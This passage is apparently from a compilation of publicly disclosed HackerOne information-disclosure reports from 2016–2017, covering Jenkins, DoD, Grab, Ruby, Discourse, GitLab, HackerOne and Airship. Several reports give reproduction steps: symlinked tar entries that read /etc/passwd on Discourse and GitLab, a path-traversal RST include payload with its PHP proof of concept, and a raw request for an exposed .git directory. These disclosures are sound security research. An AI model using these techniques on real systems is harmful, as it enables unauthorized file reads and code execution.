- **Bounty:** 15000 usd
- **Disclosed:** 2017-08-19T00:01:09.582Z
- **CVE(s):** -

**Summary (team):**

@preben_ve found a Jenkins instance where they could login with any valid Google account.

Once logged in, they gained access to sensitive API tokens. The access also included some source code disclosure for public apps and the ability to execute arbitrary code via the Jenkins Script Console.

---

### [Information disclosure vulnerability on a DoD website](https://hackerone.com/reports/186530)

- **Report ID:** `186530`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @reptou
- **Bounty:** - usd
- **Disclosed:** 2017-08-15T16:25:24.018Z
- **CVE(s):** -

**Summary (team):**

A Department of Defense website was misconfigured in a manner that could have exposed sensitive information about the web application or system. @reptou was able to demonstrate this vulnerability by crafting a specially formatted URL. Thank you for notifying us!

---

### [Git repository found](https://hackerone.com/reports/248693)

- **Report ID:** `248693`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Grab
- **Reporter:** @linkks
- **Bounty:** - usd
- **Disclosed:** 2017-08-13T18:55:41.147Z
- **CVE(s):** -

**Vulnerability Information:**

Git metadata directory (.git) was found in this folder. An attacker can extract sensitive information by requesting the hidden metadata directory that version control tool Git creates. The metadata directories are used for development purposes to keep track of development changes to a set of source code before it is committed back to a central repository (and vice-versa). When code is rolled to a live server from a repository, it is supposed to be done as an export rather than as a local working copy, and hence this problem.

Repository files/directories: 
.gitignore
README.md
ansible/Vagrantfile
ansible/development
ansible/host_vars/development
ansible/host_vars/production
ansible/production
ansible/provision.yml
ansible/roles/common/files/id_rsa
ansible/roles/common/tasks/main.yml

GET /wp-content/themes/.git/config HTTP/1.1
Host: 54.255.134.3:443
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

These files may expose sensitive information that may help an malicious user to prepare more advanced attacks.


Remove these files from production systems or restrict access to the .git directory. To deny access to all the .git folders you need to add the following lines in the appropriate context (either global config, or vhost/directory, or from .htaccess):
<Directory ~ "\.git">
Order allow,deny
Deny from all
</Directory>

---

### [Open aws s3 bucket s3://rubyci](https://hackerone.com/reports/257276)

- **Report ID:** `257276`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Ruby
- **Reporter:** @sandeep_hodkasia
- **Bounty:** - usd
- **Disclosed:** 2017-08-06T23:17:13.646Z
- **CVE(s):** -

**Vulnerability Information:**

Hello team,

### Description:

Ruby amazon aws bucket `https://rubyci.s3.amazonaws.com` is open with read only privilege which allows any authenticated aws user to read private files.
PFA screenshot.

Thanks,
Sandeep

---

### [Vine all registered user Private/sensitive information disclosure .[ Ip address/phone no/email and many other informations ]](https://hackerone.com/reports/202823)

- **Report ID:** `202823`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** X / xAI
- **Reporter:** @0xprial
- **Bounty:** - usd
- **Disclosed:** 2017-07-11T03:51:05.335Z
- **CVE(s):** -

**Summary (team):**

The reporter discovered a bug related to the Vine Archive which had the potential to expose the email address or phone number associated with a Vine account to a third party through the Vine API. The vulnerability was discovered by the reporter, triaged, and remediated within 24 hours of the associated feature launching. Vine has issued a statement regarding this vulnerability on the Vine blog (https://medium.com/@vine/47385e44ac2).

**Summary (researcher):**

Write-up about this report :- https://medium.com/bugbountywriteup/vine-users-private-information-disclosure-f1c55a3abbb6

---

### [Information disclosure vulnerability on a DoD website](https://hackerone.com/reports/189458)

- **Report ID:** `189458`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @khizer47
- **Bounty:** - usd
- **Disclosed:** 2017-06-01T15:06:50.300Z
- **CVE(s):** -

**Summary (team):**

A misconfigured Department of Defense webserver improperly disclosed application information.@babayaga_ was able to demonstrate this vulnerability by crafting specially formatted URLs.

---

### [Arbitrary Local-File Read from Admin - Restore From Backup due to Symlinks](https://hackerone.com/reports/213558)

- **Report ID:** `213558`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Discourse
- **Reporter:** @ziot
- **Bounty:** 512 usd
- **Disclosed:** 2017-05-13T21:25:53.261Z
- **CVE(s):** -

**Vulnerability Information:**

As an Admin user on Discourse there is a feature to create, upload, and restore backups. Generating a backup creates a tar file consisting of the database as a SQL file and uploaded files from /public/upload/*. Having the ability to upload these tar files and restore from them, you can add any file that you wish. 

Manually modifying the tar archive and adding a symlink, you are able to read any arbitrary file that the user has permission to including files outside of the Discourse application directory.

## Steps

1. Load http://try.discourse.org
2. Login as an Admin user.
3. Go to the Backups page:
 * http://try.discourse.org/admin/backups/
4. Create a new backup including files.
5. Extract the backup files to a folder on your server.
6. Create a symlink to `/etc/passwd` In the /uploads/ folder of the backup, e.g. `/uploads/default/original/1X/[file].jpg`.
 * example: `ln -s /etc/passwd /home/symlink/files/uploads/default/original/1X/7ad2e8f5fe02890f20503044b604e29e6f3718fd.png`
7. Create a .tar.gz from the extracted files.
8. Upload the newly crafted tar to the server.
9. Enable `Restore from Backups` in settings if it's not enabled.
10. Restore from the backup that uploaded.
11. Go to the uploaded file in your browser after it uploads, e.g.
 * http://try.discourse.org/uploads/default/original/1X/[file].jpg
12. ---> You were able to read file contents of `/etc/passwd` due to the symlink being extracted from the tar.

---

### [Subdomain Takeover](https://hackerone.com/reports/180393)

- **Report ID:** `180393`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Paragon Initiative Enterprises
- **Reporter:** @kholy
- **Bounty:** - usd
- **Disclosed:** 2017-05-05T06:03:15.111Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

Your Subdomain engineering.github.com/paragonie is Pointing to Tumblr.com

You should immediately remove the DNS-entry for engineering.zomato.com is Pointing to Tumblr.com.. Any One Can Claim That Domain , Please Read The Advisory Below.

Remediation
Please make sure you're always going through your DNS-entries so no subdomains are pointing to external services you do not use.

We've written an advisory about this at Detectify:
http://blog.detectify.com/post/100600514143/hostile-subdomain-takeover-using-heroku-github-desk

Where you can read more about this sort of attack.

I Have Done NSLookup For POC :-

nslookup github.com/paragonie
Server: 192.168.188.1
Address: 192.168.188.2#53

Non-authoritative answer:
engineering.zomato.com canonical name = domains.tumblr.com.
Name: domains.tumblr.com
Address: 66.6.42.22
Name: domains.tumblr.com
Address: 66.6.43.22

---

### [Local File Inclusion vulnerability on an Army system allows downloading local files](https://hackerone.com/reports/183978)

- **Report ID:** `183978`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @nahamsec
- **Bounty:** - usd
- **Disclosed:** 2017-01-06T21:21:25.813Z
- **CVE(s):** -

**Summary (team):**

A misconfigured Army website may have allowed unauthorized users to remotely download local files, potentially revealing sensitive system or user information. Nahamsec was able to demonstrate this vulnerability by crafting a particularly formatted URL. Thanks Nahamsec!

---

### [Internal attachments can be exported via "Export as .zip" feature](https://hackerone.com/reports/186230)

- **Report ID:** `186230`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** HackerOne
- **Reporter:** @japz
- **Bounty:** 12500 usd
- **Disclosed:** 2016-11-30T09:18:19.878Z
- **CVE(s):** -

**Vulnerability Information:**

Hello HackerOne Team

This newly disclosed report: #182358 __Partial disclosure of report activity through new "Export as .zip" feature__ was not completely fix.

I have found that i can still view the attachment after it is being removed on the thread.

Best PoC is this #182358 since this is the newly fix and disclosed.

Steps to reproduce

  1. Go to https://hackerone.com/reports/182358
  2. Export the report as .zip
  3. Now extract the .zip file (`HackerOne_Report-security#182358.zip`)
  4. You will see that the image is still there, but base on the thread, you guys removed it on disclosed report.

I have attached the .zip file downloaded and save on my local and i can still view the removed image.

__Disclosed partially removed attachment:__ {F138022}

Regards
Japz

**Summary (team):**

This issue was introduced on Monday, November 21st and resolved one week later on Monday, November 28th, within 90 minutes of the report being filed. We'd like to thank @japzdivino for bringing this to our attention and for working with us as we resolved the issue.

A new "Export as .zip" feature was released that permits teams to export the full contents of a report (including any internal comments and attachments). This is a useful feature for when a team needs to relay the full contents of a report to other colleagues who may not have access to HackerOne.

In this particular case, the vulnerability allowed for downloading internal attachments that would normally only be visible by team members. As part of our standard Root Cause Analysis, we also discovered that inline attachments could be misused to potentially view internal attachments at a future point based on guessing attachment identifiers.

HackerOne performed a thorough investigation of all uses of the "Export as .zip" functionality and have found no evidence of malicious exploitation of this vulnerability.

Note that although #182358 looks similar on the surface, it is unrelated, as it was fixed before this issue was introduced.

**Summary (researcher):**

Here is my blog: https://medium.com/pinoywhitehat/security-teams-internal-attachments-can-be-exported-via-export-as-zip-feature-on-hackerone-35ca6ec2bf8b

---

### [Partial disclosure of report activity through new "Export as .zip" feature](https://hackerone.com/reports/182358)

- **Report ID:** `182358`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** HackerOne
- **Reporter:** @faisalahmed
- **Bounty:** 10000 usd
- **Disclosed:** 2016-11-29T01:51:51.404Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Team,
I noticed a new feature has been launched, which allows to export report. Great feature.
But unfortunately it discloses comments of partially disclosed reports which supposed to be hidden..

###POC:
* Go to this partially disclosed report > https://hackerone.com/reports/██████████
* Click **Export** Button.
* You'll see comments are getting disclosed!

{F134909}

This way you can see all the partially disclosed reports comments.

Please let me know if you need more information!

Looking forward!

**Summary (team):**

This problem was introduced on Monday, November 14th and resolved the following day on Tuesday, November 15th, within one hour of the report being filed. This was an impressive find, and we want to give a huge shout-out to @faisalahmed for bringing this to our attention within 24 hours of releasing the new feature that contained this vulnerability!

When a program has publicly disclosed a report on HackerOne, the platform supports the ability to perform a [limited disclosure](https://support.hackerone.com/hc/en-us/articles/205269479). A normal disclosure includes vulnerability information, attachments, and the full timeline of activity. But a limited disclosure restricts visibility to a summary of the vulnerability and the timeline of activity (comments or actions).

In this particular case, the vulnerability allowed viewing the comments that would normally not be visible in a limited disclosure. Only comments were affected: the report's vulnerability information, attachments, and internal comments were not visible.

HackerOne performed a thorough investigation of all uses of the export functionality and have found no evidence of malicious exploitation of this vulnerability. As part of our standard process, we have notified the programs affected by @faisalahmed and his colleague during the demonstration of the proof of concept to HackerOne.

---

### [Information disclosure of website](https://hackerone.com/reports/179121)

- **Report ID:** `179121`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Brave Software
- **Reporter:** @1_1_1
- **Bounty:** - usd
- **Disclosed:** 2016-11-16T06:21:09.486Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please fill all sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty.

## Summary:
Malicious application can see what the user is browsing
[add summary of the vulnerability]

## Products affected: 
BRave browser for android
 * operating system, Brave version or Brave website page, etc.
Android Version Os : 4.4, App version:1.9.56
## Steps To Reproduce:
1)Open adb shell
2)ps | grep "app process id"
3)logcat *:D | grep "process id of app"

YOu will see all the url that the user is browsing 

 * List the steps needed to reproduce the vulnerability

## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)
http://www.androidsecurity.guru/category/logging/

---

### [Read files on application server, leads to RCE](https://hackerone.com/reports/178152)

- **Report ID:** `178152`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** GitLab
- **Reporter:** @jobert
- **Bounty:** - usd
- **Disclosed:** 2016-11-03T00:35:28.706Z
- **CVE(s):** CVE-2016-9086

**Vulnerability Information:**

The GitLab export upload feature contains a vulnerability that allows an attacker to read arbitrary files on a GitLab instance. This vulnerability is caused by the behaviour of `JSON.parse`, your error handling, and the possibility to reference a symbolic link in a GitLab export. When I started looking into this functionality, I created a demo repository and created a GitLab export through the project's admin panel. GitLab exports can be imported when creating a new project, for example at https://gitlab.com/projects/new (click GitLab export). Anyway, a simple, extracted GitLab export file contains the following files:

```
export $ ls -lash
total 48
 8 -rw-r--r--@   1 jobert  staff     5B Oct 25 19:52 VERSION
 8 -rw-r--r--@   1 jobert  staff   341B Oct 25 19:53 project.bundle
 8 lrwxr-xr-x    1 jobert  staff    11B Oct 25 20:43 project.json
```

When the export file is uploaded again, a few things happen. The first three are, in this order: it waits until the file has been written to disk (for big repositories), a version check based on the `VERSION` file, and creating a new `Project` model instance based on `project.json`. The first step isn't important. Lets look at the code that's being executed for the second step (line 12-18 from `Gitlab::ImportExport::VersionChecker`):

```ruby
def check!
  version = File.open(version_file, &:readline)
  verify_version!(version)
rescue => e
  shared.error(e)
  false
end
```

Pay attention to line 13. It will open the file and call the method `readline`, which will return the first line of the file. Now, on line 16 any exception is caught and the message is pushed onto the `errors` array. All these errors are returned to the frontend. Take a look at line 27-31 of the same file:

```ruby
if Gem::Version.new(version) != Gem::Version.new(Gitlab::ImportExport.version)
  raise Gitlab::ImportExport::Error.new("Import version mismatch: Required #{Gitlab::ImportExport.version} but was #{version}")
else
  true
end
```

This means if the version isn't correct, an exception is returned that contains the provided version from the GitLab export. Lets untar the GitLab export, replace the `VERSION` file with a symbolic link, and tar the GitLab export again. The structure of the tar will look like this:

```
export $ ls -lash
 8 lrwxr-xr-x    1 jobert  staff    11B Oct 25 20:43 VERSION -> /etc/passwd
 8 -rw-r--r--@   1 jobert  staff   341B Oct 25 19:53 project.bundle
 8 lrwxr-xr-x    1 jobert  staff    11B Oct 25 20:43 project.json
```

After creating a new GitLab export (run `tar -czvf test.tar.gz .` in the export directory), the new GitLab export can be uploaded. By doing so, the GitLab instance will return the first line of the error because the version matcher raises an exception:

{F130235}

However, with this only the first line of a file can be read. This is interesting, but much harder to exploit than if an entire file can be read. I kept digging to see if there was a way to read an entire file. Like I pointed out earlier, the third step in the import process is creating a new instance of the `Project` model. It executes the following code (line 11-22 from `Gitlab::ImportExport::ProjectTreeRestorer`):

```ruby
def restore
  json = IO.read(@path)
  tree_hash = ActiveSupport::JSON.decode(json)
  project_members = tree_hash.delete('project_members')

  ActiveRecord::Base.no_touching do
    create_relations
  end
rescue => e
  shared.error(e)
  false
end
```

A similar code structure as the version check is implemented: any exception that is thrown in line 13-18 is caught and the error message is pushed onto the errors array. It isn't immediately clear from the code, but the ActiveSupport implementation of JSON decoding uses `JSON.parse`, which returns the contents of the entire string to be decoded in the error message when it fails to decode. This means that if we can let the decoder raise an exception, we can read the contents of a file. This isn't so hard. Consider this file structure:

```
export $ ls -lash
 8 -rw-r--r--@   1 jobert  staff    11B Oct 25 20:43 VERSION
 8 -rw-r--r--@   1 jobert  staff   341B Oct 25 19:53 project.bundle
 8 lrwxr-xr-x    1 jobert  staff    11B Oct 25 20:43 project.json -> /etc/passwd
```

In this example, the `project.json` file is a symlink to `/etc/passwd`. The `IO.read` call on line 14 will follow a symlink to read the contents of a file. Obviously, the `/etc/passwd` file doesn't contain valid JSON, thus it will result in an exception with the contents of `/etc/passwd`. Use tar to compress the files again to prepare it for upload. An example file is attached: F130233. When this file gets imported, it'll show the contents of the linked file in the error message:

{F130234}

To proof that this isn't my own `/etc/passwd` file that was accidentally compressed with the file, here are the last 5 lines of the `/etc/passwd` of gitlab.com.

```
alejandro:x:1117:1117::/home/alejandro:/bin/bash
prometheus:x:999:999::/opt/prometheus:/bin/false
gitlab-monitor:x:998:998::/opt/gitlab-monitor:/bin/false
postgres:x:116:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
brian:x:1118:1118::/home/brian:/bin/bash
```

With this issue, the secrets of the GitLab rails project can be read, too. This results in an RCE because cookies can be marshalled and resigned again. It seems to also give access to the internal GitLab shell tokens, which give access to all repositories.

Let me know if you need any more information!

**Summary (researcher):**

GitLab CE/EE versions 8.9, 8.10, 8.11, 8.12, and 8.13 are vulnerable to an arbitrary file read vulnerability. The vulnerability could be exploited to gain access to the application's secrets. These secrets could be used to gain command execution access on the application server. 

The CVSS for the vulnerability in versions 8.9, 8.10, 8.11, and 8.12 is determined to be 8.4 (CVSS:3.0/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H). The CVSS for the same vulnerability in version 8.13 was determined to be 9.0, because the admin privilege was not necessary anymore to exploit the vulnerability (CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H). For all scenarios, the GitLab instance needs to have the import feature of GitLab export files enabled.

---

### [[Airship CMS] Local File Inclusion - RST Parser](https://hackerone.com/reports/179034)

- **Report ID:** `179034`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Paragon Initiative Enterprises
- **Reporter:** @h4ckninja
- **Bounty:** - usd
- **Disclosed:** 2016-10-31T13:00:04.983Z
- **CVE(s):** -

**Vulnerability Information:**

Airship uses the very useful RST Parser from Gregwar. However, the parser has the RST directive `include` built-in (why it isn't a separate directive per the spec, I don't know). However, as a result, LFI is possible in Airship.

I realize this isn't directly Paragonie's code, but since Airship uses this library, I wanted to let you know. I found two instances in the Airship codebase and don't appear to take this side effect in to account:

https://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/Cabin/Hull/Landing/CustomPages.php#L186

https://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/lens_functions.php#L714

The parser has this problem here:

https://github.com/Gregwar/RST/blob/master/Parser.php#L762. There doesn't appear to be a way for users of this library to turn it off short of re-implementing their own parser. The spec itself recognizes this security impact: http://docutils.sourceforge.net/docs/ref/rst/directives.html#include.

To demonstrate:

`rst.php`:

~~~
<?php

require('autoload.php');


$parser = new Gregwar\RST\Parser;

// RST document
$document = '*Test*

.. include:: /./../../../../../../../../../../../../../../../../../../etc/hosts

``test``
';

// Parse it
$html = $parser->parse($document);

// Render it
echo $html;
~~~

Output:

~~~
$ php rst.php
<p><em>Test</em></p>
<p>##
# Host Database
#
# localhost is used to configure the loopback interface
# when the system is booting.  Do not change this entry.
##
127.0.0.1	localhost
255.255.255.255	broadcasthost
::1             localhost </p>

[...]
~~~

---
